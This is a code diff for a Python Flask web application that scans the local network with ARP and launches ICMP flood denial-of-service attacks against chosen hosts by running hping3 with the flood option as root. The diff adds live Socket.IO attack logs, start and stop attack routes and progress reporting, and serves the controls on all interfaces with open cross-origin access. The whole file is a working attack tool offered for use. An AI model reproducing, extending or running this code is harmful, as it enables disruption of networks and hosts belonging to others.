@@ -1,6 +1,9 @@
 #!/usr/bin/env python3
+"""
+ICMP Flood Attack Web Interface with AirStrike theme
+"""
 
-from flask import Flask, render_template, jsonify, request
+from flask import Flask, render_template, jsonify, request, Blueprint
 import scapy.all as scapy
 import subprocess
 import sys
@@ -10,16 +13,65 @@ import threading
 import socket
 import re
 import signal
-from flask_cors import CORS
+import logging
+from flask_socketio import SocketIO
 
 app = Flask(__name__)
-CORS(app)
+app.config['SECRET_KEY'] = os.urandom(24)
+app.debug = False  # Disable debug mode for production use
+
+# Set up Socket.IO
+socketio = SocketIO(cors_allowed_origins="*", logger=True, engineio_logger=True)
+socketio.init_app(app)
+
+# Set up logging
+logger = logging.getLogger('icmp_flood')
+handler = logging.StreamHandler()
+handler.setFormatter(logging.Formatter(
+    '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+))
+logger.addHandler(handler)
+logger.setLevel(logging.INFO)
 
 # Global variables to track attack state
+attack_state = {
+    'running': False,
+    'attack_type': None,
+    'target_ip': None,
+    'progress': 0,
+    'log': [],
+    'stop_event': threading.Event(),
+    'threads': []
+}
+
+# Keep original variables for backward compatibility
 attack_process = None
 attack_thread = None
 attack_running = False
 current_target = None
+
+# Config
+config = {
+    'interface': 'wlan0',
+    'output_dir': './captures/'
+}
+
+# Statistics
+stats = {
+    'attacks_count': 0,
+    'scan_count': 0
+}
+
+def log_message(message):
+    """Add a log message."""
+    timestamp = time.strftime("%H:%M:%S")
+    logger.info(message)
+    attack_state['log'].append(f"[{timestamp}] {message}")
+    # Also emit via socketio if available
+    try:
+        socketio.emit('attack_log', {'message': message})
+    except:
+        pass
 
 def in_sudo_mode():
     """Ensure script is run as root."""
@@ -69,7 +121,7 @@ def get_main_interface():
         return None
 
 def run_attack(target_ip):
-    """Run hping3 ICMP flood on target IP in a separate thread."""
+    """Run hping3 ICMP flood on target IP in a separate thread (legacy version)."""
     global attack_process, attack_running
     
     try:
@@ -88,7 +140,68 @@ def run_attack(target_ip):
         attack_running = False
         attack_process = None
 
-@app.route('/')
+def run_icmp_flood(target_ip, stop_event):
+    """Run hping3 ICMP flood on target IP in a separate thread with Socket.IO updates."""
+    global attack_process, attack_running, attack_state
+    
+    try:
+        log_message(f"Starting ICMP flood attack on {target_ip}")
+        attack_process = subprocess.Popen(
+            ["sudo", "hping3", "--icmp", "--flood", target_ip],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            preexec_fn=os.setsid
+        )
+        
+        attack_state['running'] = True
+        attack_running = True
+        attack_state['progress'] = 50
+        socketio.emit('attack_progress', {'progress': 50})
+        
+        # Emit periodic updates
+        while not stop_event.is_set() and attack_process.poll() is None:
+            log_message(f"ICMP Flood continuing on {target_ip}...")
+            socketio.emit('attack_log', {'message': f"ICMP Flood continuing on {target_ip}..."})
+            stop_event.wait(5)  # Check every 5 seconds
+        
+        # If we get here and the process is still running, kill it
+        if attack_process.poll() is None:
+            os.killpg(os.getpgid(attack_process.pid), signal.SIGTERM)
+        
+    except Exception as e:
+        log_message(f"Error running ICMP flood attack: {e}")
+    finally:
+        attack_state['running'] = False
+        attack_state['attack_type'] = None
+        attack_state['target_ip'] = None
+        attack_state['progress'] = 0
+        attack_running = False
+        socketio.emit('attack_stopped', {'message': 'Attack stopped'})
+
+# Socket.IO event handlers
+@socketio.on('connect')
+def handle_connect():
+    logger.info('Client connected')
+    # Send a welcome message to confirm connection
+    socketio.emit('welcome', {'message': 'Connected to ICMP Flood server'})
+
+@socketio.on('disconnect')
+def handle_disconnect():
+    logger.info('Client disconnected')
+
+@socketio.on_error()
+def handle_error(e):
+    logger.error(f"SocketIO error: {e}")
+
+# Create blueprints
+main_bp = Blueprint('main', __name__)
+scan_bp = Blueprint('scan', __name__)
+attacks_bp = Blueprint('attacks', __name__)
+results_bp = Blueprint('results', __name__)
+settings_bp = Blueprint('settings', __name__)
+
+# Main routes
+@main_bp.route('/')
 def index():
     """Serve the main page."""
     return render_template('index.html')
@@ -98,7 +211,12 @@ def check_privileges():
     """Check if running with sudo privileges."""
     return jsonify({"has_sudo": in_sudo_mode()})
 
-@app.route('/api/scan-network')
+# Scan routes
+@scan_bp.route('/scan')
+def scan_page():
+    return render_template('scan.html')
+
+@scan_bp.route('/api/scan-network')
 def scan_network():
     """Scan the network for live hosts."""
     if not in_sudo_mode():
@@ -116,74 +234,250 @@ def scan_network():
     
     # Perform ARP scan
     hosts = arp_scan(ip_range)
+    stats['scan_count'] += 1
+    
+    # Format the hosts like AirStrike networks
+    networks = []
+    for host in hosts:
+        networks.append({
+            "BSSID": host["mac"],
+            "ESSID": f"Host {host['ip']}",
+            "channel": "N/A",
+            "signal": -50,
+            "encryption": "N/A",
+            "ip": host["ip"]  # Adding IP address as a custom field
+        })
     
     return jsonify({
+        "networks": networks,
         "interface": main_iface,
-        "ip_range": ip_range,
-        "hosts": hosts
+        "scan_time": time.time()
     })
 
-@app.route('/api/start-attack', methods=['POST'])
-def start_attack():
-    """Start ICMP flood attack on specified target."""
-    global attack_thread, attack_running, current_target
-    
-    if not in_sudo_mode():
-        return jsonify({"error": "Sudo privileges required"}), 403
-    
-    if attack_running:
-        return jsonify({"error": "Attack already running"}), 400
-    
-    data = request.get_json()
-    target_ip = data.get('target_ip')
-    
-    if not target_ip:
-        return jsonify({"error": "Target IP required"}), 400
-    
-    # Validate IP format
-    try:
-        socket.inet_aton(target_ip)
-    except socket.error:
-        return jsonify({"error": "Invalid IP address"}), 400
-    
-    current_target = target_ip
-    attack_thread = threading.Thread(target=run_attack, args=(target_ip,))
-    attack_thread.daemon = True
-    attack_thread.start()
-    
-    return jsonify({"message": f"Attack started on {target_ip}"})
+# Attack routes
+@attacks_bp.route('/attack')
+def attack_page():
+    return render_template('attack.html')
 
-@app.route('/api/stop-attack', methods=['POST'])
-def stop_attack():
-    """Stop the current ICMP flood attack."""
-    global attack_process, attack_running, current_target
+@attacks_bp.route('/start_attack', methods=['POST'])
+def start_attack():
+    """
+    Start an attack based on the provided parameters.
     
-    if not attack_running or not attack_process:
-        return jsonify({"error": "No attack currently running"}), 400
+    Expected JSON payload:
+    {
+        "network": {
+            "bssid": "00:11:22:33:44:55",
+            "essid": "NetworkName",
+            "ip": "192.168.1.1"  # IP address for ICMP attack
+        },
+        "attack_type": "icmp_flood",
+        "config": {
+            // Attack-specific configuration
+        }
+    }
+    """
+    global attack_thread, attack_state, attack_running, current_target
     
     try:
-        # Kill the process group to ensure hping3 is terminated
-        os.killpg(os.getpgid(attack_process.pid), signal.SIGTERM)
+        # Check if an attack is already running
+        if attack_state['running'] or attack_running:
+            return jsonify({'success': False, 'error': 'An attack is already running'})
+        
+        # Validate request data
+        data = request.json
+        if not data:
+            return jsonify({'success': False, 'error': 'No data provided'})
+        
+        if 'network' not in data:
+            # Try legacy format
+            target_ip = data.get('target_ip')
+            if not target_ip:
+                return jsonify({'success': False, 'error': 'Target IP required'})
+                
+            # Validate IP format
+            try:
+                socket.inet_aton(target_ip)
+            except socket.error:
+                return jsonify({'success': False, 'error': 'Invalid IP address'})
+                
+            # Legacy start attack
+            current_target = target_ip
+            attack_thread = threading.Thread(target=run_attack, args=(target_ip,))
+            attack_thread.daemon = True
+            attack_thread.start()
+            
+            return jsonify({"message": f"Attack started on {target_ip}"})
+        
+        # Modern AirStrike-style format
+        network = data['network']
+        attack_type = data.get('attack_type', 'icmp_flood')
+        attack_config = data.get('config', {})
+        
+        target_ip = network.get('ip')
+        if not target_ip:
+            return jsonify({'success': False, 'error': 'IP address required for ICMP flood attack'})
+        
+        # Validate IP format
+        try:
+            socket.inet_aton(target_ip)
+        except socket.error:
+            return jsonify({'success': False, 'error': 'Invalid IP address'})
+        
+        # Initialize attack state
+        attack_state['running'] = True
+        attack_state['attack_type'] = attack_type
+        attack_state['target_ip'] = target_ip
+        attack_state['progress'] = 0
+        attack_state['log'] = []
+        attack_state['stop_event'].clear()
+        attack_state['threads'] = []
+        
+        # Legacy compatibility
+        current_target = target_ip
+        attack_running = True
+        
+        # Log the start of the attack
+        log_message(f"Starting {attack_type} attack on {target_ip}")
+        
+        # Emit attack started event via WebSocket
+        socketio.emit('attack_started', {
+            'attack_type': attack_type,
+            'target_network': network
+        })
+        
+        # Start ICMP flood thread
+        icmp_thread = threading.Thread(
+            target=run_icmp_flood,
+            args=(target_ip, attack_state['stop_event']),
+            daemon=True
+        )
+        
+        attack_state['threads'].append(icmp_thread)
+        attack_thread = icmp_thread  # For legacy compatibility
+        icmp_thread.start()
+        
+        stats['attacks_count'] += 1
+        
+        return jsonify({'success': True})
+        
+    except Exception as e:
+        log_message(f"Error starting attack: {e}")
+        attack_state['running'] = False
+        attack_running = False
+        socketio.emit('attack_error', {'error': str(e)})
+        return jsonify({'success': False, 'error': str(e)})
+
+@attacks_bp.route('/stop_attack', methods=['POST'])
+def stop_attack():
+    """Stop the running attack."""
+    global attack_process, attack_running, current_target, attack_state
+    
+    # Check both new and legacy status
+    if not (attack_state['running'] or attack_running):
+        return jsonify({'success': False, 'error': 'No attack currently running'})
+    
+    try:
+        # Set stop event for thread-safe stopping
+        attack_state['stop_event'].set()
+        
+        # Also handle legacy process termination
+        if attack_process and attack_process.poll() is None:
+            os.killpg(os.getpgid(attack_process.pid), signal.SIGTERM)
+        
+        # Update states
         attack_running = False
         current_target = None
-        return jsonify({"message": "Attack stopped"})
+        attack_state['running'] = False
+        attack_state['target_ip'] = None
+        
+        # Log and notify
+        log_message("Attack stopped by user")
+        socketio.emit('attack_stopped', {'message': 'Attack stopped by user'})
+        
+        return jsonify({'success': True, 'message': 'Attack stopped'})
     except Exception as e:
-        return jsonify({"error": f"Error stopping attack: {str(e)}"}), 500
+        log_message(f"Error stopping attack: {e}")
+        return jsonify({'success': False, 'error': f'Error stopping attack: {str(e)}'})
 
-@app.route('/api/attack-status')
+@attacks_bp.route('/attack_status')
 def attack_status():
-    """Get current attack status."""
+    """Get the current attack status."""
+    # Combine new and legacy stats for compatibility
     return jsonify({
-        "running": attack_running,
-        "target": current_target
+        'running': attack_state['running'] or attack_running,
+        'attack_type': attack_state['attack_type'] or 'icmp_flood',
+        'progress': attack_state['progress'],
+        'target_ip': attack_state['target_ip'] or current_target
     })
+
+@app.route('/api/attack-status')  # Legacy route
+def legacy_attack_status():
+    """Legacy route for current attack status."""
+    return jsonify({
+        "running": attack_running or attack_state['running'],
+        "target": current_target or attack_state['target_ip']
+    })
+
+# Results routes
+@results_bp.route('/results')
+def results_page():
+    return render_template('results.html')
+
+@results_bp.route('/get_attack_log')
+def get_attack_log():
+    return jsonify({
+        'log': attack_state['log'],
+        'running': attack_state['running'] or attack_running,
+        'progress': attack_state['progress']
+    })
+
+# Settings route
+@settings_bp.route('/settings')
+def settings_page():
+    return render_template('settings.html')
+
+# Error handlers
+@app.errorhandler(404)
+def page_not_found(e):
+    """Handle 404 errors."""
+    logger.warning(f"404 error: {request.path}")
+    return render_template('error.html', error=f"Page {request.path} not found"), 404
+
+@app.errorhandler(500)
+def internal_server_error(e):
+    """Handle 500 errors."""
+    logger.error(f"500 error: {str(e)}")
+    return render_template('error.html', error=str(e)), 500
+
+# Register blueprints
+app.register_blueprint(main_bp)
+app.register_blueprint(scan_bp, url_prefix='/scan')
+app.register_blueprint(attacks_bp, url_prefix='/attacks')
+app.register_blueprint(results_bp, url_prefix='/results')
+app.register_blueprint(settings_bp, url_prefix='/settings')
 
 if __name__ == '__main__':
     if not in_sudo_mode():
-        print("Please run this application with sudo privileges:")
-        print("sudo python3 app.py")
+        print("=" * 80)
+        print("ERROR: ICMP Flood must be run with root privileges!")
+        print("The application will now exit.")
+        print("Please restart with: sudo python app.py")
+        print("=" * 80)
         sys.exit(1)
+        
+    # Create output directory if it doesn't exist
+    os.makedirs(config['output_dir'], exist_ok=True)
     
-    print("Starting ICMP Flood Web Application...")
-    print("Access the application at: http://localhost:5000")
-    app.run(debug=True, host='0.0.0.0', port=5000)
+    print("\n" + "=" * 60)
+    print("Starting ICMP Flood with Socket.IO enabled")
+    print("Using root privileges: {}".format("Yes" if in_sudo_mode() else "No"))
+    
+    # Print a clickable link with different formats for better compatibility
+    print("\nAccess the web interface at:")
+    print("\033[1;34mhttp://localhost:5000\033[0m")  # Bold blue
+    print("\033]8;;http://localhost:5000\033\\Click here to open in browser\033]8;;\033\\")  # Hyperlink
+    print("=" * 60 + "\n")
+    
+    # Run the Flask app with Socket.IO
+    socketio.run(app, debug=False, host='0.0.0.0', port=5000)
